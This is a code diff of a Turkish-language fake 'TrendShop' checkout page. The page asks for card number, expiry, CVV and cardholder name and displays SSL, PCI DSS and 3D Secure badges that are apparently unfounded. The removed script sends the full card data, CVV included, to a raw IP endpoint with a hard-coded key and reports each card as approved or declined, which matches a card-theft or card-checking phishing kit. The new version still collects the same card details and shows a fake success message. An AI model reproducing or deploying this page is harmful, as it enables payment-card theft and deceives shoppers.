@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
@@ -22,109 +22,152 @@
         }
 
         .checkout-container {
-            max-width: 600px;
+            max-width: 480px;
             width: 100%;
             background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            padding: 32px 28px;
             position: relative;
         }
 
-        .security-badge {
+        /* Header */
+        .header {
             display: flex;
-            align-items: center;
-            gap: 8px;
-            background: #f8f9fa;
-            padding: 10px 16px;
-            border-radius: 8px;
-            margin-bottom: 24px;
-            font-size: 13px;
-            color: #28a745;
-        }
-
-        .security-badge svg {
-            width: 20px;
-            height: 20px;
-            fill: #28a745;
-        }
-
-        .store-header {
-            display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
+            align-items: center;
+            margin-bottom: 28px;
+            padding-bottom: 18px;
             border-bottom: 2px solid #f0f2f5;
         }
 
-        .store-logo {
-            font-size: 24px;
+        .logo {
+            font-size: 22px;
             font-weight: 700;
             color: #1a1a2e;
         }
 
-        .store-logo span {
+        .logo span {
             color: #e74c3c;
         }
 
-        .order-summary {
+        .order-id {
+            font-size: 13px;
+            color: #8e8e93;
             background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 30px;
+            padding: 4px 12px;
+            border-radius: 20px;
         }
 
-        .order-summary .total {
+        /* Güvenlik Badge */
+        .security {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #f8f9fa;
+            padding: 8px 14px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #28a745;
+        }
+
+        .security svg {
+            width: 16px;
+            height: 16px;
+            fill: #28a745;
+        }
+
+        /* Sipariş Özeti */
+        .order-summary {
+            background: #fafbfc;
+            border-radius: 12px;
+            padding: 16px 18px;
+            margin-bottom: 24px;
+        }
+
+        .order-line {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #6c757d;
+            padding: 4px 0;
+        }
+
+        .order-total {
             display: flex;
             justify-content: space-between;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             color: #1a1a2e;
+            border-top: 2px solid #e9ecef;
+            padding-top: 12px;
+            margin-top: 6px;
         }
 
-        .order-summary .total-price {
+        .order-total .price {
             color: #e74c3c;
-            font-size: 22px;
         }
 
+        /* Başlık */
         .payment-title {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
             color: #1a1a2e;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .payment-title small {
             font-weight: 400;
-            font-size: 14px;
-            color: #6c757d;
+            font-size: 13px;
+            color: #8e8e93;
+            margin-left: 6px;
         }
 
-        .form-group {
+        /* Kart Ikonları */
+        .card-icons {
+            display: flex;
+            gap: 10px;
             margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #f0f2f5;
+        }
+
+        .card-icons span {
+            font-size: 28px;
+        }
+
+        .card-icons .text {
+            font-size: 12px;
+            color: #8e8e93;
+            margin-right: 6px;
+            align-self: center;
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 18px;
         }
 
         .form-group label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             color: #495057;
-            margin-bottom: 6px;
+            margin-bottom: 5px;
         }
 
         .form-group label .required {
             color: #e74c3c;
-            margin-left: 2px;
         }
 
         .form-control {
             width: 100%;
-            padding: 12px 16px;
+            padding: 12px 14px;
             border: 2px solid #e1e5eb;
             border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s ease;
+            font-size: 15px;
+            transition: border-color 0.2s;
             background: #fafbfc;
         }
 
@@ -132,7 +175,7 @@
             outline: none;
             border-color: #4a90d9;
             background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(74, 144, 217, 0.1);
+            box-shadow: 0 0 0 3px rgba(74, 144, 217, 0.08);
         }
 
         .form-control::placeholder {
@@ -143,156 +186,91 @@
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 16px;
+            gap: 14px;
         }
 
         .form-row-3 {
             display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 16px;
+            grid-template-columns: 1fr 0.6fr 0.6fr;
+            gap: 12px;
         }
 
-        .card-icons {
-            display: flex;
-            gap: 8px;
-            margin-top: 4px;
-        }
-
-        .card-icons img {
-            height: 24px;
-            opacity: 0.6;
-        }
-
-        .card-icons img.active {
-            opacity: 1;
-        }
-
-        .btn-pay {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #2d3436 0%, #1a1a2e 100%);
-            color: #ffffff;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 8px;
-            position: relative;
-        }
-
-        .btn-pay:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-        }
-
-        .btn-pay:active {
-            transform: translateY(0);
-        }
-
-        .btn-pay:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-pay .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .btn-pay.loading .spinner {
-            display: block;
-        }
-
-        .btn-pay.loading .btn-text {
-            display: none;
-        }
-
-        .result-box {
-            margin-top: 20px;
-            padding: 16px 20px;
-            border-radius: 10px;
-            display: none;
-            font-weight: 500;
-        }
-
-        .result-box.success {
-            display: block;
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .result-box.error {
-            display: block;
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-
-        .result-box.info {
-            display: block;
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }
-
-        .result-box .result-detail {
-            font-size: 14px;
-            font-weight: 400;
-            margin-top: 4px;
-            word-break: break-all;
-        }
-
+        /* Kart Önizleme */
         .card-preview {
-            margin-top: 16px;
-            padding: 12px 16px;
             background: #f8f9fa;
-            border-radius: 8px;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-top: 16px;
             font-size: 14px;
-            color: #6c757d;
+            color: #495057;
             display: none;
+            border: 1px dashed #dee2e6;
         }
 
         .card-preview.active {
             display: block;
         }
 
-        .footer-text {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 12px;
-            color: #6c757d;
+        .card-preview .label {
+            color: #8e8e93;
+            font-weight: 400;
         }
 
-        .footer-text a {
+        .card-preview .number {
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+
+        /* Buton */
+        .btn-pay {
+            width: 100%;
+            padding: 16px;
+            background: #2d3436;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        .btn-pay:hover {
+            background: #1a1a2e;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        }
+
+        .btn-pay:active {
+            transform: translateY(0);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e93;
+            line-height: 1.6;
+        }
+
+        .footer a {
             color: #4a90d9;
             text-decoration: none;
         }
 
-        .ssl-badge {
+        .ssl-badges {
             display: flex;
             justify-content: center;
             gap: 16px;
-            margin-top: 16px;
+            margin-top: 14px;
             font-size: 12px;
-            color: #6c757d;
+            color: #8e8e93;
         }
 
-        .ssl-badge span {
+        .ssl-badges span {
             display: flex;
             align-items: center;
             gap: 4px;
@@ -300,7 +278,7 @@
 
         @media (max-width: 480px) {
             .checkout-container {
-                padding: 20px;
+                padding: 20px 16px;
             }
             .form-row {
                 grid-template-columns: 1fr;
@@ -316,53 +294,53 @@
 </head>
 <body>
     <div class="checkout-container">
-        <!-- Güvenlik Badgesi -->
-        <div class="security-badge">
+        <!-- Güvenlik -->
+        <div class="security">
             <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5L12 1zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-            <span>256-bit SSL ile güvenli bağlantı</span>
+            <span>256-bit SSL güvenli bağlantı</span>
         </div>
 
-        <!-- Mağaza Başlığı -->
-        <div class="store-header">
-            <div class="store-logo">🛍️ <span>Trend</span>Shop</div>
-            <div style="font-size:14px;color:#6c757d;">#SIP-2026-001</div>
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">🛍️ <span>Trend</span>Shop</div>
+            <div class="order-id">#SIP-2026</div>
         </div>
 
         <!-- Sipariş Özeti -->
         <div class="order-summary">
-            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+            <div class="order-line">
                 <span>Ürünler (2 adet)</span>
                 <span>₺1.249,90</span>
             </div>
-            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+            <div class="order-line">
                 <span>Kargo</span>
                 <span>₺24,90</span>
             </div>
-            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+            <div class="order-line">
                 <span>İndirim</span>
                 <span style="color:#28a745;">-₺74,80</span>
             </div>
-            <div class="total" style="border-top:2px solid #e1e5eb;padding-top:12px;">
+            <div class="order-total">
                 <span>Toplam</span>
-                <span class="total-price">₺1.200,00</span>
+                <span class="price">₺1.200,00</span>
             </div>
         </div>
 
-        <!-- Ödeme Başlığı -->
+        <!-- Başlık -->
         <div class="payment-title">
             💳 Kart Bilgileri
             <small>| Tüm kartlar geçerlidir</small>
         </div>
 
         <!-- Kart Ikonları -->
-        <div class="card-icons" style="margin-bottom:16px;">
-            <span style="font-size:13px;color:#6c757d;margin-right:8px;">Kabul edilen kartlar:</span>
-            <span style="font-size:20px;">💳</span>
-            <span style="font-size:20px;">🏦</span>
-            <span style="font-size:20px;">💳</span>
+        <div class="card-icons">
+            <span class="text">Kabul edilen kartlar:</span>
+            <span>💳</span>
+            <span>🏦</span>
+            <span>💳</span>
         </div>
 
-        <!-- KART FORMU -->
+        <!-- FORM -->
         <form id="paymentForm">
             <!-- Kart Numarası -->
             <div class="form-group">
@@ -371,7 +349,7 @@
                        placeholder="0000 0000 0000 0000" 
                        maxlength="19"
                        required>
-                <div style="font-size:12px;color:#6c757d;margin-top:4px;">
+                <div style="font-size:11px;color:#8e8e93;margin-top:4px;">
                     Örn: 4508 0312 3456 7890
                 </div>
             </div>
@@ -409,7 +387,7 @@
                        required>
             </div>
 
-            <!-- Taksit Seçeneği -->
+            <!-- Taksit -->
             <div class="form-group">
                 <label>Taksit Seçeneği</label>
                 <select class="form-control" id="installment">
@@ -422,40 +400,30 @@
 
             <!-- Kart Önizleme -->
             <div class="card-preview" id="cardPreview">
-                <span style="font-weight:500;">🔹 Kart: </span>
-                <span id="previewCard">**** **** **** ****</span>
+                <span class="label">🔹 Kart: </span>
+                <span class="number" id="previewCard">**** **** **** ****</span>
             </div>
 
             <!-- Buton -->
             <button type="submit" class="btn-pay" id="payButton">
-                <span class="btn-text">✅ Ödemeyi Tamamla - ₺1.200,00</span>
-                <div class="spinner"></div>
+                💳 Ödemeyi Tamamla - ₺1.200,00
             </button>
         </form>
 
-        <!-- Sonuç Kutusu -->
-        <div class="result-box" id="resultBox">
-            <div id="resultMessage"></div>
-            <div class="result-detail" id="resultDetail"></div>
-        </div>
-
         <!-- SSL Badges -->
-        <div class="ssl-badge">
+        <div class="ssl-badges">
             <span>🔒 256-bit SSL</span>
             <span>🛡️ PCI DSS</span>
             <span>🏦 3D Secure</span>
         </div>
 
-        <div class="footer-text">
-            Güvenli alışveriş için kart bilgileriniz 256-bit SSL ile şifrelenir.<br>
+        <div class="footer">
+            Güvenli alışveriş için kart bilgileriniz şifrelenir.<br>
             Sorularınız için <a href="#">destek@trendshop.com</a>
         </div>
     </div>
 
     <script>
-        const API_URL = "http://185.7.242.6:5002/check";
-        const API_KEY = "zazababa2026";
-
         // Kart numarası formatlama
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = this.value.replace(/\D/g, '');
@@ -473,7 +441,7 @@
             }
         });
 
-        // Expiry formatlama
+        // Expiry formatlama (AA/YY)
         document.getElementById('expiry').addEventListener('input', function(e) {
             let value = this.value.replace(/\D/g, '');
             if (value.length > 2) {
@@ -482,106 +450,52 @@
             this.value = value;
         });
 
-        // Form gönderimi
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+        // Form gönderimi - Sadece mesaj gösterir
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const button = document.getElementById('payButton');
-            const resultBox = document.getElementById('resultBox');
-            const resultMessage = document.getElementById('resultMessage');
-            const resultDetail = document.getElementById('resultDetail');
-
-            // Kart bilgilerini al
-            let cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const year = document.getElementById('year').value;
             const cvv = document.getElementById('cvv').value;
             const cardHolder = document.getElementById('cardHolder').value;
+            const installment = document.getElementById('installment').value;
 
-            // Validasyon
+            // Basit validasyon
             if (!cardNumber || cardNumber.length < 16) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Lütfen geçerli bir kart numarası giriniz.';
-                resultDetail.textContent = 'Kart numarası 16 haneli olmalıdır.';
+                alert('❌ Lütfen geçerli bir kart numarası giriniz. (16 hane)');
                 return;
             }
 
             if (!expiry || expiry.length < 5) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Lütfen geçerli bir son kullanma tarihi giriniz.';
-                resultDetail.textContent = 'Örn: 11/28';
+                alert('❌ Lütfen son kullanma tarihini giriniz. (AA/YY)');
                 return;
             }
 
             if (!year || year.length < 2) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Lütfen geçerli bir yıl giriniz.';
-                resultDetail.textContent = 'Örn: 28';
+                alert('❌ Lütfen yıl bilgisini giriniz. (YY)');
                 return;
             }
 
             if (!cvv || cvv.length < 3) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Lütfen geçerli bir CVV giriniz.';
-                resultDetail.textContent = 'CVV 3 veya 4 haneli olmalıdır.';
+                alert('❌ Lütfen CVV kodunuzu giriniz.');
                 return;
             }
 
             if (!cardHolder || cardHolder.length < 3) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Lütfen kart sahibinin adını giriniz.';
-                resultDetail.textContent = 'Ad Soyad giriniz.';
+                alert('❌ Lütfen kart sahibinin adını giriniz.');
                 return;
             }
 
-            // Ay'ı expiry'den al
-            const month = expiry.split('/')[0];
+            // Başarılı mesajı
+            const button = document.getElementById('payButton');
+            button.textContent = '✅ İşleminiz Gerçekleşti!';
+            button.style.background = '#28a745';
 
-            // API'ye gönder
-            const cardData = `${cardNumber}|${month}|${year}|${cvv}`;
-
-            // Butonu yükleme moduna al
-            button.disabled = true;
-            button.classList.add('loading');
-
-            resultBox.className = 'result-box info';
-            resultMessage.textContent = '⏳ Ödeme işleminiz kontrol ediliyor...';
-            resultDetail.textContent = 'Lütfen bekleyiniz.';
-
-            try {
-                const response = await fetch(`${API_URL}?card=${encodeURIComponent(cardData)}&key=${API_KEY}`);
-                const data = await response.json();
-
-                if (data.tur === 'charge') {
-                    const sonuc = data.sonuc;
-                    
-                    if (sonuc.includes('APPROVED')) {
-                        resultBox.className = 'result-box success';
-                        resultMessage.innerHTML = '✅ ÖDEME ONAYLANDI!';
-                        resultDetail.textContent = sonuc;
-                    } else if (sonuc.includes('Kart geçersiz')) {
-                        resultBox.className = 'result-box error';
-                        resultMessage.innerHTML = '❌ KART GEÇERSİZ!';
-                        resultDetail.textContent = 'Girdiğiniz kart numarası geçersizdir. Lütfen kontrol ediniz.';
-                    } else {
-                        resultBox.className = 'result-box error';
-                        resultMessage.innerHTML = '❌ ÖDEME REDDEDİLDİ!';
-                        resultDetail.textContent = sonuc;
-                    }
-                } else {
-                    resultBox.className = 'result-box error';
-                    resultMessage.textContent = '❌ Bir hata oluştu.';
-                    resultDetail.textContent = data.sonuc || 'Bilinmeyen hata.';
-                }
-            } catch (error) {
-                resultBox.className = 'result-box error';
-                resultMessage.textContent = '❌ Bağlantı hatası!';
-                resultDetail.textContent = 'API\'ye bağlanılamadı. Lütfen daha sonra tekrar deneyin.';
-                console.error('Hata:', error);
-            } finally {
-                button.disabled = false;
-                button.classList.remove('loading');
-            }
+            setTimeout(() => {
+                button.textContent = '💳 Ödemeyi Tamamla - ₺1.200,00';
+                button.style.background = '#2d3436';
+            }, 3000);
         });
     </script>
 </body>
